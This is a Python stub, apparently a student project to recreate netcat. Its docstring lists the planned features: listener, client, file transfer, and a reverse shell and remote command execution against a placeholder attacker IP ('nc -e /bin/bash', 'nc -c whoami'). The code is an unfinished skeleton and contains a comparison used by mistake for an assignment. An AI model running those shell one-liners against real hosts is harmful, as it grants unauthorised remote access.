#!/bin/python3

"""
subject: Recreate netcat (administration swiss knife tool)

For this project, i want to implement just some type of netcat:
	- basic client server communication:
		* listener : nc -lvp <Port>
		* connect : nc <IP_Address> <Port>
	
	- file upload and download:
		* upload : nc <Receiver_IP> <Port> < file.txt
		* download : nc -lvp <Port> > file.txt
	
	- reverse shell and command execution
		* reverse shell : nc -e /bin/bash <Attacker_IP> <Port>
		* command execution : nc -c whoami <Attacker_IP> <Port>
"""
import sys
import subprocess
import ft_parser, ft_client, ft_server

def	execute(args):
	print("execute cmd")
	if args["LISTENNING"]:
		if args["IP"] == "":
			args["IP"] == "0.0.0.0"
		if args["CMD"]:
			print("launch cmd")
		ft_server.serve(args["IP"], args["PORT"])
	else:
		print("act as client")
		if args["CMD"]:
			print("launch cmd")
		#logic
		ft_client.link(args["IP"], args["PORT"])

def	server():
	print("server")

def client():
	print("client")

def main():
	print("main")

if __name__ == "__main__":
	args = ft_parser.parse()
	print(args)
	ft_parser.checkArgs(args)
	execute(args)
